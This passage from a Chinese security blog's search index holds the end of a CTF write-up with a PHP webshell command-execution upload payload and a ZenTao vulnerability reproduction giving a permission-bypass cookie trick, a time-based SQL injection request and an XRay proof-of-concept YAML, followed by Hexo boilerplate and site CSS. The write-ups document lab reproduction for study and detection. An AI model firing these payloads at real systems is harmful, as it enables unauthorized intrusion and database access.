class="line">POST /index.php?code=?&gt;&lt;?=`.+/%3f%3f%3f/%3f%3f%3f%3f%3f%3f%3f%3f[%3f-[]`;?&gt; HTTP/1.1</span><br><span class="line">Host: 192.168.136.128:9090</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------212777633523460541891388609784</span><br><span class="line">Content-Length: 230</span><br><span class="line">Origin: null</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">-----------------------------212777633523460541891388609784</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.txt&quot;</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">#!/bin/sh</span><br><span class="line">id</span><br><span class="line">-----------------------------212777633523460541891388609784--</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/web-hate-php/image-20230224110206019.png" alt="image-20230224110206019"></p><p>更改上传文件内容，即可执行不同的命令；</p><p>将上面的URL地址替换成靶场地址，更改文件命令，即可获取到flag；</p><p><img src="/web-hate-php/image-20230224111535061.png" alt="image-20230224111535061"></p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</span><br><span class="line">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html?page=2#reply-list</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 命令执行 </tag>
            
            <tag> webshell </tag>
            
            <tag> 小技巧 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【漏洞复现】禅道系统权限绕过及SQL注入</title>
      <link href="/posts/1460621.html"/>
      <url>/posts/1460621.html</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>禅道项目管理系统权限认证存在逻辑缺陷，攻击者可在未授权的情况下，利用该漏洞绕过系统权限认证，进行SQL注入攻击；</p><p><strong>漏洞影响：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v17.4&lt;= 禅道 &lt;= v18.0.beta1（开源版）</span><br><span class="line">v3.4 &lt;= 禅道 &lt;= v4.0.beta1（旗舰版）</span><br><span class="line">v7.4 &lt;= 禅道 &lt;= v8.0.beta1（企业版）</span><br></pre></td></tr></table></figure><p><strong>网络空间测绘：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app=&quot;易软天创-禅道系统&quot;</span><br></pre></td></tr></table></figure><h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>使用docker搭建开源17.6版本禅道系统；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker pull idoop/zentao:17.6</span><br></pre></td></tr></table></figure><p>执行如下命令启动禅道系统；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p /data/zbox &amp;&amp; \</span><br><span class="line">docker run -d -p 80:80 -p 3306:3306 \</span><br><span class="line">        -e ADMINER_USER=&quot;root&quot; -e ADMINER_PASSWD=&quot;password&quot; \</span><br><span class="line">        -e BIND_ADDRESS=&quot;false&quot; \</span><br><span class="line">        -v /data/zbox/:/opt/zbox/ \</span><br><span class="line">        --add-host smtp.exmail.qq.com:163.177.90.125 \</span><br><span class="line">        --name zentao-server \</span><br><span class="line">        idoop/zentao:latest</span><br></pre></td></tr></table></figure><p><img src="/zentao-unauth-sql/image-20230120101350310.png" alt="image-20230120101350310"></p><p>待环境启动成功后，访问如下地址即可访问禅道系统登录页面；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/zentao/</span><br></pre></td></tr></table></figure><p><img src="/zentao-unauth-sql/image-20230120101549832.png" alt="image-20230120101549832"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>访问如下链接即可获取到禅道系统版本信息；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">目标URL + /www/index.php?mode=getconfig</span><br><span class="line">http://127.0.0.1/zentao/www/index.php?mode=getconfig</span><br></pre></td></tr></table></figure><p><img src="/zentao-unauth-sql/image-20230120102045430.png" alt="image-20230120102045430"></p><p>访问目标系统URL，发现会跳转到登录页面，是<code>html</code>伪静态页面；</p><p><img src="/zentao-unauth-sql/image-20230120102534597.png" alt="image-20230120102534597"></p><p><img src="/zentao-unauth-sql/image-20230120101549832.png" alt="image-20230120101549832"></p><p>当系统使用的是伪静态页面时，访问如下的URL链接，获取<code>cookie</code>信息；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">目标URL + /misc-captcha-user-1.html</span><br><span class="line">http://127.0.0.1/zentao/misc-captcha-user-1.html</span><br></pre></td></tr></table></figure><p><img src="/zentao-unauth-sql/image-20230120131310050.png" alt="image-20230120131310050"></p><p>利用获取到的<code>cookie</code>信息构造如下的数据包，在<code>convert-importNotice.html</code>进行SQL注入攻击；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /zentao/convert-importNotice.html HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: python-requests/2.27.0</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://127.0.0.1/zentao/</span><br><span class="line">cookie: zentaosid=69e19dab95bbaa9e5be27fcde7549e47; path=/zentao/; HttpOnly, lang=zh-cn; expires=Sun, 19-Feb-2023 03:17:39 GMT; Max-Age=2592000; path=/zentao/, device=desktop; expires=Sun, 19-Feb-2023 03:17:39 GMT; Max-Age=2592000; path=/zentao/; HttpOnly, theme=default; expires=Sun, 19-Feb-2023 03:17:39 GMT; Max-Age=2592000; path=/zentao/</span><br><span class="line">Content-Length: 27</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">dbName=&#x27;;select%20sleep(5)#</span><br></pre></td></tr></table></figure><p><img src="/zentao-unauth-sql/image-20230120131851919.png" alt="image-20230120131851919"></p><h2 id="XRay-POC"><a href="#XRay-POC" class="headerlink" title="XRay POC"></a>XRay POC</h2><p>使用XRay POC进行验证；</p><p><img src="/zentao-unauth-sql/image-20230120143406260.png" alt="image-20230120143406260"></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">poc-yaml-zentao-unauth-sql</span></span><br><span class="line"><span class="attr">manual:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">transport:</span> <span class="string">http</span></span><br><span class="line"><span class="attr">set:</span></span><br><span class="line">    <span class="attr">referer:</span> <span class="string">request.url</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line">    <span class="attr">r0:</span></span><br><span class="line">        <span class="attr">request:</span></span><br><span class="line">            <span class="attr">cache:</span> <span class="literal">true</span></span><br><span class="line">            <span class="attr">method:</span> <span class="string">GET</span></span><br><span class="line">            <span class="attr">path:</span> <span class="string">/misc-captcha-user-1.html</span></span><br><span class="line">            <span class="attr">follow_redirects:</span> <span class="literal">false</span></span><br><span class="line">        <span class="attr">expression:</span> <span class="string">response.status</span> <span class="string">==</span> <span class="number">200</span> <span class="string">&amp;&amp;</span> <span class="string">response.body.bcontains(bytes(string(&quot;captcha.class.php&quot;)))</span></span><br><span class="line">        <span class="attr">output:</span></span><br><span class="line">            <span class="attr">search:</span> <span class="string">&#x27;&quot;Set-Cookie:(?P&lt;cookie&gt;.+?);&quot;.bsubmatch(response.body)&#x27;</span></span><br><span class="line">            <span class="attr">cookie:</span> <span class="string">search[&quot;cookie&quot;]</span></span><br><span class="line">    <span class="attr">r1:</span></span><br><span class="line">        <span class="attr">request:</span></span><br><span class="line">            <span class="attr">cache:</span> <span class="literal">true</span></span><br><span class="line">            <span class="attr">method:</span> <span class="string">POST</span></span><br><span class="line">            <span class="attr">path:</span> <span class="string">/convert-importNotice.html</span></span><br><span class="line">            <span class="attr">headers:</span></span><br><span class="line">                <span class="attr">Cookie:</span> <span class="string">&#x27;<span class="template-variable">&#123;&#123;cookie&#125;&#125;</span>&#x27;</span></span><br><span class="line">                <span class="attr">Referer:</span> <span class="string">&#x27;<span class="template-variable">&#123;&#123;referer&#125;&#125;</span>&#x27;</span></span><br><span class="line">                <span class="attr">Content-Type:</span> <span class="string">application/x-www-form-urlencoded</span></span><br><span class="line">            <span class="attr">body:</span> <span class="string">&quot;dbName=&#x27;;select%20user(X)#&quot;</span></span><br><span class="line">            <span class="attr">follow_redirects:</span> <span class="literal">false</span></span><br><span class="line">        <span class="attr">expression:</span> <span class="string">response.status</span> <span class="string">==</span> <span class="number">200</span> <span class="string">&amp;&amp;</span> <span class="string">response.body.bcontains(bytes(string(&quot;dao.class.php&quot;)))</span> <span class="string">&amp;&amp;</span> <span class="string">response.body.bcontains(bytes(string(&quot;;select</span> <span class="string">user(X...&quot;)))</span></span><br><span class="line"><span class="attr">expression:</span> <span class="string">r0()</span> <span class="string">&amp;&amp;</span> <span class="string">r1()</span></span><br><span class="line"><span class="attr">detail:</span></span><br><span class="line">    <span class="attr">author:</span> <span class="string">IMF5er</span></span><br><span class="line">    <span class="attr">links:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">https://www.baidu.com/</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">https://www.cnblogs.com/spmonkey/p/17050708.html</span></span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/spmonkey/p/17050708.html</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 禅道系统 </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> 权限绕过 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/posts/4a17b156.html"/>
      <url>/posts/4a17b156.html</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title></title>
      <link href="/manifest.json"/>
      <url>/manifest.json</url>
      
        <content type="html"><![CDATA[{"name":"小师弟`Blog","short_name":"小师弟","theme_color":"#3b70fc","background_color":"#3b70fc","display":"standalone","scope":"/","start_url":"/","icons":[{"src":"/img/siteicon/16.png","sizes":"16x16","type":"image/png"},{"src":"/img/siteicon/32.png","sizes":"32x32","type":"image/png"},{"src":"/img/siteicon/48.png","sizes":"48x48","type":"image/png"},{"src":"/img/siteicon/64.png","sizes":"64x64","type":"image/png"},{"src":"/img/siteicon/128.png","sizes":"128x128","type":"image/png"},{"src":"/img/siteicon/144.png","sizes":"144x144","type":"image/png"},{"src":"/img/siteicon/512.png","sizes":"512x512","type":"image/png"}],"splash_pages":null}]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>关于我</title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>分类</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/css/custom.css"/>
      <url>/css/custom.css</url>
      
        <content type="html"><![CDATA[/* @font-face {  font-family: Candyhome;  src: url(https://npm.elemecdn.com/anzhiyu-blog@1.1.6/fonts/Candyhome.ttf);  font-display: swap;  font-weight: lighter;} */@font-face {  font-family: ZhuZiAYuanJWD;  src: url(https://npm.elemecdn.com/anzhiyu-blog@1.1.6/fonts/ZhuZiAWan.woff2);  font-display: swap;  font-weight: lighter;}div#menus {  font-family: "ZhuZiAYuanJWD";}h1#site-title {  font-family: ZhuZiAYuanJWD;  font-size: 3em !important;}a.article-title,a.blog-slider__title,a.categoryBar-list-link,h1.post-title {  font-family: ZhuZiAYuanJWD;}.iconfont {  font-family: "iconfont" !important;  font-size: 3em;  /* 可以定义图标大小 */  font-style: normal;  -webkit-font-smoothing: antialiased;  -moz-osx-font-smoothing: grayscale;}/* 时间轴生肖icon */svg.icon {  /* 这里定义svg.icon，避免和Butterfly自带的note标签冲突 */  width: 1em;  height: 1em;  /* width和height定义图标的默认宽度和高度*/  vertical-align: -0.15em;  fill: currentColor;  overflow: hidden;}.icon-zhongbiao::before {  color: #f7c768;}/* bilibli番剧插件 */#article-container .bangumi-tab.bangumi-active {  background: var(--anzhiyu-theme);  color: var(--anzhiyu-ahoverbg);  border-radius: 10px;}a.bangumi-tab:hover {  text-decoration: none !important;}.bangumi-button:hover {  background: var(--anzhiyu-theme) !important;  border-radius: 10px !important;  color: var(--anzhiyu-ahoverbg) !important;}a.bangumi-button.bangumi-nextpage:hover {  text-decoration: none !important;}.bangumi-button {  padding: 5px 10px !important;}a.bangumi-tab {  padding: 5px 10px !important;}svg.icon.faa-tada {  font-size: 1.1em;}.bangumi-info-item {  border-right: 1px solid #f2b94b;}.bangumi-info-item span {  color: #f2b94b;}.bangumi-info-item em {  color: #f2b94b;}/* 解决artitalk的图标问题 */#uploadSource > svg {  width: 1.19em;  height: 1.5em;}/*top-img黑色透明玻璃效果移除，不建议加，除非你执着于完全一图流或者背景图对比色明显 */#page-header:not(.not-top-img):before {  background-color: transparent !important;}/* 首页文章卡片 */#recent-posts > .recent-post-item {  background: rgba(255, 255, 255, 0.9);}/* 首页侧栏卡片 */#aside-content .card-widget {  background: rgba(255, 255, 255, 0.9);}/* 文章页面正文背景 */div#post {  background: rgba(255, 255, 255, 0.9);}/* 分页页面 */div#page {  background: rgba(255, 255, 255, 0.9);}/* 归档页面 */div#archive {  background: rgba(255, 255, 255, 0.9);}/* 标签页面 */div#tag {  background: rgba(255, 255, 255, 0.9);}/* 分类页面 */div#category {  background: rgba(255, 255, 255, 0.9);}/*夜间模式伪类遮罩层透明*/[data-theme="dark"] #recent-posts > .recent-post-item {  background: #121212;}[data-theme="dark"] .card-widget {  background: #121212 !important;}[data-theme="dark"] div#post {  background: #121212 !important;}[data-theme="dark"] div#tag {  background: #121212 !important;}[data-theme="dark"] div#archive {  background: #121212 !important;}[data-theme="dark"] div#page {  background: #121212 !important;}[data-theme="dark"] div#category {  background: #121212 !important;}[data-theme="dark"] div#category {  background: transparent !important;}/* 页脚透明 */#footer {  background: transparent !important;}/* 头图透明 */#page-header {  background: transparent !important;}#rightside > div > button {  border-radius: 5px;}/* 滚动条 */::-webkit-scrollbar {  width: 10px;  height: 10px;}::-webkit-scrollbar-thumb {  background-color: #3b70fc;  border-radius: 2em;}::-webkit-scrollbar-corner {  background-color: transparent;}::-moz-selection {  color: #fff;  background-color: #3b70fc;}/* 音乐播放器 *//* .aplayer .aplayer-lrc {  display: none !important;} */.aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {  left: -66px !important;  transition: all 0.3s;  /* 默认情况下缩进左侧66px，只留一点箭头部分 */}.aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {  left: 0 !important;  transition: all 0.3s;  /* 鼠标悬停是左侧缩进归零，完全显示按钮 */}.aplayer.aplayer-fixed {  z-index: 999999 !important;}/* 评论框  */.vwrap {  box-shadow: 2px 2px 5px #bbb;  background: rgba(255, 255, 255, 0.3);  border-radius: 8px;  padding: 30px;  margin: 30px 0px 30px 0px;}/* 设置评论框 */.vcard {  box-shadow: 2px 2px 5px #bbb;  background: rgba(255, 255, 255, 0.3);  border-radius: 8px;  padding: 30px;  margin: 30px 0px 0px 0px;}/* md网站下划线 */#article-container a:hover {  text-decoration: none !important;}#article-container #hpp_talk p img {  display: inline;}/* 404页面 */#error-wrap {  position: absolute;  top: 40%;  right: 0;  left: 0;  margin: 0 auto;  padding: 0 1rem;  max-width: 1000px;  transform: translate(0, -50%);}#error-wrap .error-content {  display: flex;  flex-direction: row;  justify-content: center;  align-items: center;  margin: 0 1rem;  height: 18rem;  border-radius: 8px;  background: var(--card-bg);  box-shadow: var(--card-box-shadow);  transition: all 0.3s;}#error-wrap .error-content .error-img {  box-flex: 1;  flex: 1;  height: 100%;  border-top-left-radius: 8px;  border-bottom-left-radius: 8px;  background-color: #3b70fc;  background-position: center;  background-size: cover;}#error-wrap .error-content .error-info {  box-flex: 1;  flex: 1;  padding: 0.5rem;  text-align: center;  font-size: 14px;  font-family: Titillium Web, "PingFang SC", "Hiragino Sans GB", "Microsoft JhengHei", "Microsoft YaHei", sans-serif;}#error-wrap .error-content .error-info .error_title {  margin-top: -4rem;  font-size: 9em;}#error-wrap .error-content .error-info .error_subtitle {  margin-top: -3.5rem;  word-break: break-word;  font-size: 1.6em;}#error-wrap .error-content .error-info a {  display: inline-block;  margin-top: 0.5rem;  padding: 0.3rem 1.5rem;  background: var(--btn-bg);  color: var(--btn-color);}#body-wrap.error .aside-list {  display: flex;  flex-direction: row;  flex-wrap: nowrap;  bottom: 0px;  position: absolute;  padding: 1rem;  width: 100%;  overflow: scroll;}#body-wrap.error .aside-list .aside-list-group {  display: flex;  flex-direction: row;  flex-wrap: nowrap;  max-width: 1200px;  margin: 0 auto;}#body-wrap.error .aside-list .aside-list-item {  padding: 0.5rem;}#body-wrap.error .aside-list .aside-list-item img {  width: 100%;  object-fit: cover;  border-radius: 12px;}#body-wrap.error .aside-list .aside-list-item .thumbnail {  overflow: hidden;  width: 230px;  height: 143px;  background: var(--anzhiyu-card-bg);  display: flex;}#body-wrap.error .aside-list .aside-list-item .content .title {  -webkit-line-clamp: 2;  overflow: hidden;  display: -webkit-box;  -webkit-box-orient: vertical;  line-height: 1.5;  justify-content: center;  align-items: flex-end;  align-content: center;  padding-top: 0.5rem;  color: white;}#body-wrap.error .aside-list .aside-list-item .content time {  display: none;}/* 代码框主题 */#article-container figure.highlight {  border-radius: 10px;}]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>友情链接</title>
      <link href="/link/index.html"/>
      <url>/link/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>标签</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
  
</search>
